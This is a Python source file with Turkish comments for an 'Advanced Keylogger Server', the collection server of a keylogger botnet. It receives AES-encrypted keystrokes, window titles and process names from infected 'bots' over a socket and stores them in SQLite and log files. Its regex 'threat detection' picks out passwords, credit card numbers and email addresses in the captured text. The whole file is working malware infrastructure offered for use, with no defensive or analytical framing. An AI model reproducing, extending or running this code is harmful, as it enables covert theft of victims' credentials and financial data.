from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from collections import defaultdict
from datetime import datetime, timedelta
import base64
import hashlib
import socket
import threading
import json
import time
import os
import re
import sqlite3
import hashlib
import platform
import psutil
import requests
import subprocess
import urllib.parse
import ssl
import select
import struct

# Renk kodları
BLUE = "\033[94m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

class AdvancedKeyloggerServer:
    def __init__(self, host='0.0.0.0', port=8081, encryption_key="SecretBotNetKey2025", 
                 ssl_enabled=False, ssl_cert=None, ssl_key=None):
        self.host = host
        self.port = port
        self.encryption_key = hashlib.sha256(encryption_key.encode()).digest()
        self.ssl_enabled = ssl_enabled
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        
        # Gelişmiş bot yönetimi
        self.active_bots = {}
        self.bot_sessions = {}
        self.bot_statistics = defaultdict(dict)
        self.lock = threading.Lock()
        
        # AI ve analiz sistemleri
        self.ai_enabled = True
        self.behavioral_analysis = True
        self.threat_detection = True
        self.pattern_recognition = True
        
        # Veri tabanı
        self.db_path = "keylogger_data.db"
        self.init_database()
        
        # Güvenlik özellikleri
        self.rate_limiting = True
        self.max_connections_per_ip = 5
        self.connection_attempts = defaultdict(int)
        self.blocked_ips = set()
        
        # Gelişmiş loglama
        self.log_dir = "logs"
        self.ensure_log_directory()
        
        # Analiz araçları
        self.key_patterns = {
            'passwords': r'(password|passwd|pwd|şifre|parola)',
            'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_cards': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
            'urls': r'https?://[^\s<>"]+|www\.[^\s<>"]+\b',
            'ip_addresses': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        }
        
        # AI modelleri
        self.behavior_models = {}
        self.threat_models = {}
        self.initialize_ai_models()
        
        print(f"{GREEN}[+] Advanced Keylogger Server initialized{RESET}")
        print(f"{CYAN}[*] AI Systems: {self.ai_enabled}{RESET}")
        print(f"{CYAN}[*] Behavioral Analysis: {self.behavioral_analysis}{RESET}")
        print(f"{CYAN}[*] Threat Detection: {self.threat_detection}{RESET}")

    def init_database(self):
        """Veri tabanını başlatır"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Bot sessions tablosu
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bot_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_id TEXT NOT NULL,
                    session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    session_end TIMESTAMP,
                    ip_address TEXT,
                    platform TEXT,
                    total_keys INTEGER DEFAULT 0,
                    suspicious_activity INTEGER DEFAULT 0
                )
            ''')
            
            # Key logs tablosu
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS key_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_id TEXT NOT NULL,
                    session_id INTEGER,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    key_data TEXT,
                    window_title TEXT,
                    process_name TEXT,
                    suspicious_score REAL DEFAULT 0.0
                )
            ''')
            
            # Threat alerts tablosu
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS threat_alerts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_id TEXT NOT NULL,
                    alert_type TEXT,
                    severity TEXT,
                    description TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    resolved BOOLEAN DEFAULT FALSE
                )
            ''')
            
            # Behavioral patterns tablosu
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS behavioral_patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_id TEXT NOT NULL,
                    pattern_type TEXT,
                    pattern_data TEXT,
                    confidence REAL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            print(f"{GREEN}[+] Database initialized successfully{RESET}")
            
        except Exception as e:
            print(f"{RED}[!] Database initialization error: {str(e)}{RESET}")

    def ensure_log_directory(self):
        """Log dizinini oluşturur"""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
            print(f"{GREEN}[+] Log directory created: {self.log_dir}{RESET}")

    def initialize_ai_models(self):
        """AI modellerini başlatır"""
        if not self.ai_enabled:
            return
            
        try:
            # Basit davranış modelleri
            self.behavior_models = {
                'typing_patterns': {},
                'time_patterns': {},
                'application_patterns': {},
                'suspicious_patterns': {}
            }
            
            # Tehdit modelleri
            self.threat_models = {
                'password_attempts': defaultdict(int),
                'suspicious_sequences': [],
                'anomaly_detection': {}
            }
            
            print(f"{GREEN}[+] AI models initialized{RESET}")
            
        except Exception as e:
            print(f"{RED}[!] AI model initialization error: {str(e)}{RESET}")
    
    def encrypt_data(self, data):
        """Veriyi AES-256-CBC ile şifreler"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        iv = get_random_bytes(16)
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        return iv + encrypted_data

    def decrypt_data(self, encrypted_data):
        """Şifreli veriyi çözer"""
        try:
            iv = encrypted_data[:16]
            actual_data = encrypted_data[16:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(actual_data), AES.block_size)
            return decrypted_data.decode('utf-8')
        except Exception as e:
            print(f"{RED}[!] Decryption error: {str(e)}{RESET}")
            return None

    def analyze_key_data(self, key_data, bot_id, window_title="", process_name=""):
        """Key verilerini analiz eder"""
        analysis_result = {
            'suspicious_score': 0.0,
            'detected_patterns': [],
            'threats': [],
            'behavioral_insights': {}
        }
        
        # Şüpheli pattern'leri kontrol et
        for pattern_name, pattern_regex in self.key_patterns.items():
            matches = re.findall(pattern_regex, key_data, re.IGNORECASE)
            if matches:
                analysis_result['detected_patterns'].append({
                    'type': pattern_name,
                    'matches': matches,
                    'count': len(matches)
                })
                analysis_result['suspicious_score'] += 0.3
        
        # Davranışsal analiz
        if self.behavioral_analysis:
            behavioral_insights = self.analyze_behavioral_patterns(key_data, bot_id)
            analysis_result['behavioral_insights'] = behavioral_insights
        
        # Tehdit tespiti
        if self.threat_detection:
            threats = self.detect_threats(key_data, bot_id)
            analysis_result['threats'] = threats
            if threats:
                analysis_result['suspicious_score'] += 0.5
        
        return analysis_result

    def analyze_behavioral_patterns(self, key_data, bot_id):
        """Davranışsal pattern'leri analiz eder"""
        insights = {}
        
        # Yazma hızı analizi
        if len(key_data) > 10:
            # Basit yazma hızı hesaplama
            typing_speed = len(key_data) / 60  # karakter/saniye
            insights['typing_speed'] = typing_speed
            
            if typing_speed > 10:  # Çok hızlı yazma
                insights['suspicious_typing'] = True
        
        # Zaman pattern'leri
        current_hour = datetime.now().hour
        if current_hour < 6 or current_hour > 23:  # Gece aktivitesi
            insights['night_activity'] = True
        
        # Uygulama pattern'leri
        if 'chrome' in key_data.lower() or 'firefox' in key_data.lower():
            insights['browser_activity'] = True
        
        return insights

    def detect_threats(self, key_data, bot_id):
        """Tehditleri tespit eder"""
        threats = []
        
        # Şifre denemeleri
        password_indicators = ['password', 'passwd', 'pwd', 'şifre', 'parola']
        for indicator in password_indicators:
            if indicator in key_data.lower():
                threats.append({
                    'type': 'password_attempt',
                    'severity': 'medium',
                    'description': f'Password field detected: {indicator}'
                })
        
        # Kredi kartı numaraları
        if re.search(r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b', key_data):
            threats.append({
                'type': 'credit_card',
                'severity': 'high',
                'description': 'Credit card number detected'
            })
        
        # E-posta adresleri
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', key_data)
        if emails:
            threats.append({
                'type': 'email_address',
                'severity': 'low',
                'description': f'Email addresses detected: {emails}'
            })
        
        return threats

    def log_to_database(self, bot_id, key_data, analysis_result, window_title="", process_name=""):
        """Verileri veri tabanına kaydeder"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Session kontrolü
            cursor.execute('''
                SELECT id FROM bot_sessions 
                WHERE bot_id = ? AND session_end IS NULL
                ORDER BY session_start DESC LIMIT 1
            ''', (bot_id,))
            
            session_result = cursor.fetchone()
            if session_result:
                session_id = session_result[0]
            else:
                # Yeni session oluştur
                cursor.execute('''
                    INSERT INTO bot_sessions (bot_id, ip_address, platform)
                    VALUES (?, ?, ?)
                ''', (bot_id, "unknown", "unknown"))
                session_id = cursor.lastrowid
            
            # Key log kaydet
            cursor.execute('''
                INSERT INTO key_logs (bot_id, session_id, key_data, window_title, process_name, suspicious_score)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (bot_id, session_id, key_data, window_title, process_name, analysis_result['suspicious_score']))
            
            # Tehdit alert'leri kaydet
            for threat in analysis_result['threats']:
                cursor.execute('''
                    INSERT INTO threat_alerts (bot_id, alert_type, severity, description)
                    VALUES (?, ?, ?, ?)
                ''', (bot_id, threat['type'], threat['severity'], threat['description']))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"{RED}[!] Database logging error: {str(e)}{RESET}")
        
    def handle_bot(self, conn, addr):
        """Bot bağlantısını yönetir"""
        bot_id = None
        session_start = datetime.now()
        
        try:
            # Rate limiting kontrolü
            if self.rate_limiting:
                if addr[0] in self.blocked_ips:
                    print(f"{RED}[!] Blocked IP attempted connection: {addr[0]}{RESET}")
                    return
                
                self.connection_attempts[addr[0]] += 1
                if self.connection_attempts[addr[0]] > self.max_connections_per_ip:
                    self.blocked_ips.add(addr[0])
                    print(f"{RED}[!] IP blocked due to excessive connections: {addr[0]}{RESET}")
                    return
            
            # Bot ID'yi al
            encrypted_bot_id = conn.recv(1024)
            if not encrypted_bot_id:
                return
                
            bot_id = self.decrypt_data(encrypted_bot_id)
            if not bot_id:
                return
            
            # Bot session'ını başlat
            with self.lock:
                self.active_bots[bot_id] = {
                    'conn': conn,
                    'addr': addr,
                    'start_time': session_start,
                    'total_keys': 0,
                    'suspicious_activity': 0
                }
            
            print(f"{GREEN}[+] Keylogger active: {bot_id} from {addr[0]}{RESET}")
            
            # Log dosyası oluştur
            log_file = os.path.join(self.log_dir, f"keylog_{bot_id}_{session_start.strftime('%Y%m%d_%H%M%S')}.txt")
            
            with open(log_file, "a", buffering=1) as f:
                f.write(f"\n=== New Session [{session_start}] ===\n")
                f.write(f"Bot ID: {bot_id}\n")
                f.write(f"IP Address: {addr[0]}\n")
                f.write(f"Platform: {platform.system()}\n")
                f.write("=" * 50 + "\n")
                
                while True:
                    # Şifreli veriyi al
                    encrypted_data = conn.recv(4096)
                    if not encrypted_data:
                        break
                    
                    # Şifreyi çöz
                    decrypted_data = self.decrypt_data(encrypted_data)
                    if not decrypted_data:
                        continue
                    
                    # JSON formatında veri kontrolü
                    try:
                        data = json.loads(decrypted_data)
                        key_data = data.get('key_data', '')
                        window_title = data.get('window_title', '')
                        process_name = data.get('process_name', '')
                        timestamp = data.get('timestamp', datetime.now().isoformat())
                    except json.JSONDecodeError:
                        # Eski format - sadece key data
                        key_data = decrypted_data
                        window_title = ""
                        process_name = ""
                        timestamp = datetime.now().isoformat()
                    
                    # Veriyi analiz et
                    analysis_result = self.analyze_key_data(key_data, bot_id, window_title, process_name)
                    
                    # Veri tabanına kaydet
                    self.log_to_database(bot_id, key_data, analysis_result, window_title, process_name)
                    
                    # Log dosyasına yaz
                    log_entry = f"[{timestamp}] {key_data}"
                    if window_title:
                        log_entry += f" (Window: {window_title})"
                    if process_name:
                        log_entry += f" (Process: {process_name})"
                    
                    f.write(log_entry + "\n")
                    
                    # Şüpheli aktivite kontrolü
                    if analysis_result['suspicious_score'] > 0.5:
                        print(f"{YELLOW}[!] Suspicious activity detected from {bot_id}: {analysis_result['detected_patterns']}{RESET}")
                        with self.lock:
                            self.active_bots[bot_id]['suspicious_activity'] += 1
                    
                    # İstatistikleri güncelle
                    with self.lock:
                        self.active_bots[bot_id]['total_keys'] += len(key_data)
                    
                    # Real-time analiz
                    if self.ai_enabled and analysis_result['threats']:
                        for threat in analysis_result['threats']:
                            print(f"{RED}[THREAT] {bot_id}: {threat['description']} (Severity: {threat['severity']}){RESET}")
                
        except ConnectionResetError:
            print(f"{YELLOW}[-] Connection reset by {bot_id or addr[0]}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error handling bot {bot_id or addr[0]}: {str(e)}{RESET}")
        finally:
            # Session'ı temizle
            if bot_id:
                with self.lock:
                    if bot_id in self.active_bots:
                        session_data = self.active_bots[bot_id]
                        session_end = datetime.now()
                        duration = session_end - session_data['start_time']
                        
                        print(f"{CYAN}[-] Session ended: {bot_id} (Duration: {duration}, Keys: {session_data['total_keys']}, Suspicious: {session_data['suspicious_activity']}){RESET}")
                        
                        # Session'ı veri tabanında güncelle
                        try:
                            conn = sqlite3.connect(self.db_path)
                            cursor = conn.cursor()
                            cursor.execute('''
                                UPDATE bot_sessions 
                                SET session_end = ?, total_keys = ?, suspicious_activity = ?
                                WHERE bot_id = ? AND session_end IS NULL
                            ''', (session_end, session_data['total_keys'], session_data['suspicious_activity'], bot_id))
                            conn.commit()
                            conn.close()
                        except Exception as e:
                            print(f"{RED}[!] Session update error: {str(e)}{RESET}")
                        
                        del self.active_bots[bot_id]

    def get_statistics(self):
        """İstatistikleri döndürür"""
        stats = {
            'active_bots': len(self.active_bots),
            'total_sessions': 0,
            'total_keys': 0,
            'suspicious_activities': 0,
            'threats_detected': 0
        }
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Toplam session sayısı
            cursor.execute('SELECT COUNT(*) FROM bot_sessions')
            stats['total_sessions'] = cursor.fetchone()[0]
            
            # Toplam key sayısı
            cursor.execute('SELECT COUNT(*) FROM key_logs')
            stats['total_keys'] = cursor.fetchone()[0]
            
            # Şüpheli aktivite sayısı
            cursor.execute('SELECT COUNT(*) FROM threat_alerts')
            stats['threats_detected'] = cursor.fetchone()[0]
            
            conn.close()
            
        except Exception as e:
            print(f"{RED}[!] Statistics error: {str(e)}{RESET}")
        
        return stats

    def start(self):
        """Sunucuyu başlatır"""
        try:
            # SSL desteği
            if self.ssl_enabled and self.ssl_cert and self.ssl_key:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(self.ssl_cert, self.ssl_key)
                
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind((self.host, self.port))
                    s.listen(5)
                    
                    with context.wrap_socket(s, server_side=True) as ssock:
                        print(f"{GREEN}[*] SSL Keylogger server listening on {self.host}:{self.port}{RESET}")
                        
                        while True:
                            conn, addr = ssock.accept()
                            threading.Thread(target=self.handle_bot, args=(conn, addr)).start()
            else:
                # Normal socket
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind((self.host, self.port))
                    s.listen(5)
                    
                    print(f"{GREEN}[*] Advanced Keylogger server listening on {self.host}:{self.port}{RESET}")
                    print(f"{CYAN}[*] AI Systems: {self.ai_enabled}{RESET}")
                    print(f"{CYAN}[*] Behavioral Analysis: {self.behavioral_analysis}{RESET}")
                    print(f"{CYAN}[*] Threat Detection: {self.threat_detection}{RESET}")
                    
                    while True:
                        conn, addr = s.accept()
                        threading.Thread(target=self.handle_bot, args=(conn, addr)).start()
                        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Server shutting down...{RESET}")
            self.shutdown()
        except Exception as e:
            print(f"{RED}[!] Server error: {str(e)}{RESET}")

    def shutdown(self):
        """Sunucuyu kapatır"""
        print(f"{YELLOW}[!] Shutting down server...{RESET}")
        
        # Aktif bağlantıları kapat
        with self.lock:
            for bot_id, bot_data in self.active_bots.items():
                try:
                    bot_data['conn'].close()
                except:
                    pass
        
        # İstatistikleri göster
        stats = self.get_statistics()
        print(f"{CYAN}[*] Final Statistics:{RESET}")
        print(f"  - Total Sessions: {stats['total_sessions']}")
        print(f"  - Total Keys: {stats['total_keys']}")
        print(f"  - Threats Detected: {stats['threats_detected']}")

if __name__ == '__main__':
    # Gelişmiş sunucu başlat
    server = AdvancedKeyloggerServer(
        host='0.0.0.0',
        port=8081,
        encryption_key="SecretBotNetKey2025",
        ssl_enabled=False  # SSL sertifikaları varsa True yapın
    )
    
    try:
        server.start()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Server stopped by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Server error: {str(e)}{RESET}")